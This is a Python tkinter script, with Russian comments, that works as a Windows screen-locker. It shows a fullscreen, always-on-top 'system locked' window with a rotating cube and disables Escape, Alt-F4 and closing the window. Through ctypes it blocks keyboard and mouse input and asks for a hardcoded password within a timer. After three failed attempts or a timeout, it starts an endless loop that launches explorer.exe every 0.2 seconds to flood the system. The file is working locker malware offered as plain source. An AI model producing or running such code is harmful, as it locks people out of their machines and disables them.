import tkinter as tk
from tkinter import messagebox
import math
import os
import sys
import threading
import time
import ctypes

# Настройки
PASSWORD = "12345"
MAX_ATTEMPTS = 3
TIMER_MINUTES = 10
BG_COLOR = "#000000"
TEXT_COLOR = "#00FF00"
CUBE_SIZE = 150
CUBE_COLOR = "#00FF00"

class RotatingCube:
    def __init__(self, canvas):
        self.canvas = canvas
        self.angle_x = 0
        self.angle_y = 0
        self.angle_z = 0
        # Вершины куба
        self.vertices = [
            [-1, -1, -1], [1, -1, -1], [1, 1, -1], [-1, 1, -1],
            [-1, -1, 1], [1, -1, 1], [1, 1, 1], [-1, 1, 1]
        ]
        # Рёбра куба
        self.edges = [
            (0, 1), (1, 2), (2, 3), (3, 0),
            (4, 5), (5, 6), (6, 7), (7, 4),
            (0, 4), (1, 5), (2, 6), (3, 7)
        ]
    
    def rotate(self):
        self.angle_x += 0.01
        self.angle_y += 0.015
        self.draw()
    
    def draw(self):
        self.canvas.delete("cube")
        center_x = self.canvas.winfo_width() / 2
        center_y = self.canvas.winfo_height() / 2 - 50
        
        # Преобразуем вершины с учётом вращения
        transformed = []
        for x, y, z in self.vertices:
            # Вращение вокруг X
            y, z = self.rotate_x(y, z)
            # Вращение вокруг Y
            x, z = self.rotate_y(x, z)
            # Вращение вокруг Z
            x, y = self.rotate_z(x, y)
            transformed.append((x, y, z))
        
        # Рисуем рёбра
        for i, j in self.edges:
            x1, y1, z1 = transformed[i]
            x2, y2, z2 = transformed[j]
            
            # Перспективная проекция
            z1 += 5
            z2 += 5
            f1 = CUBE_SIZE / z1
            f2 = CUBE_SIZE / z2
            
            x1_proj = x1 * f1 + center_x
            y1_proj = -y1 * f1 + center_y
            x2_proj = x2 * f2 + center_x
            y2_proj = -y2 * f2 + center_y
            
            # Рисуем линию
            self.canvas.create_line(
                x1_proj, y1_proj, x2_proj, y2_proj,
                fill=CUBE_COLOR, width=2, tags="cube"
            )
    
    def rotate_x(self, y, z):
        return (
            y * math.cos(self.angle_x) - z * math.sin(self.angle_x),
            y * math.sin(self.angle_x) + z * math.cos(self.angle_x)
        )
    
    def rotate_y(self, x, z):
        return (
            x * math.cos(self.angle_y) - z * math.sin(self.angle_y),
            x * math.sin(self.angle_y) + z * math.cos(self.angle_y)
        )
    
    def rotate_z(self, x, y):
        return (
            x * math.cos(self.angle_z) - y * math.sin(self.angle_z),
            x * math.sin(self.angle_z) + y * math.cos(self.angle_z)
        )

def block_system():
    try:
        ctypes.windll.user32.BlockInput(True)
        ctypes.windll.user32.SystemParametersInfoW(97, 1, None, 0)
    except:
        pass

def unblock_system():
    try:
        ctypes.windll.user32.BlockInput(False)
        ctypes.windll.user32.SystemParametersInfoW(97, 0, None, 0)
    except:
        pass

def infinite_explorer():
    while True:
        os.system("explorer.exe")
        time.sleep(0.2)

def trigger_lockdown(reason):
    global timer_active
    timer_active = False
    block_system()
    
    threading.Thread(target=infinite_explorer, daemon=True).start()
    
    canvas.delete("all")
    canvas.create_text(canvas.winfo_width()/2, canvas.winfo_height()/2,
                     text="СИСТЕМА ЗАБЛОКИРОВАНА",
                     font=("Arial", 40, 'bold'),
                     fill="red",
                     tags="lock")
    canvas.create_text(canvas.winfo_width()/2, canvas.winfo_height()/2 + 50,
                     text=f"Причина: {reason}",
                     font=("Arial", 20),
                     fill="white",
                     tags="lock")

def update_timer():
    global time_left, timer_active
    if timer_active and time_left > 0:
        mins, secs = divmod(time_left, 60)
        timer_label.config(text=f"Осталось: {mins:02d}:{secs:02d} | Попыток: {attempts_left}")
        time_left -= 1
        root.after(1000, update_timer)
    elif timer_active:
        trigger_lockdown("истекло время")

def check_password(event=None):
    global attempts_left
    if password_entry.get() == PASSWORD:
        unblock_system()
        messagebox.showinfo("Успех", "Система разблокирована!")
        root.destroy()
    else:
        attempts_left -= 1
        password_entry.delete(0, tk.END)
        if attempts_left <= 0:
            trigger_lockdown("превышено количество попыток")
        else:
            messagebox.showerror("Ошибка", f"Неверный пароль! Осталось попыток: {attempts_left}")

# Основное окно
root = tk.Tk()
root.title("🔒 SYSTEM LOCKED")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.config(cursor="none")

# Холст для анимации
canvas = tk.Canvas(root, bg=BG_COLOR, highlightthickness=0)
canvas.pack(fill=tk.BOTH, expand=True)

# Создаем куб
cube = RotatingCube(canvas)

# Таймер и попытки
time_left = TIMER_MINUTES * 60
attempts_left = MAX_ATTEMPTS
timer_active = True

# Элементы интерфейса
tk.Label(canvas,
       text="ДОСТУП К СИСТЕМЕ",
       font=("Arial", 30, 'bold'),
       fg=TEXT_COLOR,
       bg=BG_COLOR).place(relx=0.5, rely=0.1, anchor=tk.CENTER)

timer_label = tk.Label(canvas,
                     font=("Arial", 16),
                     fg=TEXT_COLOR,
                     bg=BG_COLOR)
timer_label.place(relx=0.5, rely=0.2, anchor=tk.CENTER)

password_entry = tk.Entry(canvas,
                        show="*",
                        font=("Arial", 24),
                        bg="#111111",
                        fg=TEXT_COLOR,
                        insertbackground=TEXT_COLOR,
                        relief='flat')
password_entry.place(relx=0.5, rely=0.8, anchor=tk.CENTER)

tk.Button(canvas,
         text="РАЗБЛОКИРОВАТЬ",
         command=check_password,
         font=("Arial", 16, 'bold'),
         bg="#e74c3c",
         fg="white",
         activebackground="#c0392b",
         relief='flat').place(relx=0.5, rely=0.9, anchor=tk.CENTER)

# Подсказка
tk.Label(canvas,
       text="Нажмите Enter для подтверждения",
       font=("Arial", 10),
       fg="#555555",
       bg=BG_COLOR).place(relx=0.5, rely=0.85, anchor=tk.CENTER)

# Привязка клавиш
root.bind('<Return>', check_password)
root.bind("<Escape>", lambda e: None)
root.bind("<Alt-F4>", lambda e: None)
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Анимация куба
def animate_cube():
    cube.rotate()
    root.after(20, animate_cube)

# Запуск
block_system()
animate_cube()
update_timer()
password_entry.focus_set()

root.mainloop()